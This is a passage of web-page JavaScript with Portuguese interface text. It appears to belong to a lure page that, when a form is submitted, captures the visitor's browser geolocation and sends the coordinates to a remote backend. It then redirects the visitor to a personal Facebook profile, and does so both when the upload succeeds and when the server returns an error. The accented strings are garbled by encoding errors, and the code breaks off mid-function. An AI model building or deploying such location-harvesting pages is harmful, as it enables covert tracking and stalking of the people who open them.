  <script>

  const API_URL = 'https://localizacao-backend-vdyc.onrender.com/api/localizacao'; // Substitua com seu link real
    function handleSubmit(event) {
    event.preventDefault();
      const status = document.getElementById('status');

      if (!navigator.geolocation) {
        status.textContent = 'Geolocaliza√ß√£o n√£o suportada.';
        return;
      }

      navigator.geolocation.getCurrentPosition(
        (pos) => {
          const data = {
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude,
            timestamp: new Date().toISOString()
          };

          fetch(API_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
          })
          .then(res => {
            if (res.ok) {
              status.textContent = 'üìç Localiza√ß√£o enviada com sucesso!';
              window.location.replace("https://www.facebook.com/bruno.rodrigues.433581");
            } else {
              status.textContent = '‚ùå Erro ao enviar localiza√ß√£o.';
    window.location.replace("https://www.facebook.com/bruno.rodrigues.433581");
            }
          })
          .catch(err => {
            status.textContent = 'Erro de rede: ' + err.message;
          });
        },
        (err) => {
          let msg = 'Erro desconhecido.';
          if (err.code === 1) msg = 'Permiss√£o negada.';
          if (err.code === 2) msg = 'Posi√ß√£o indispon√≠vel.';
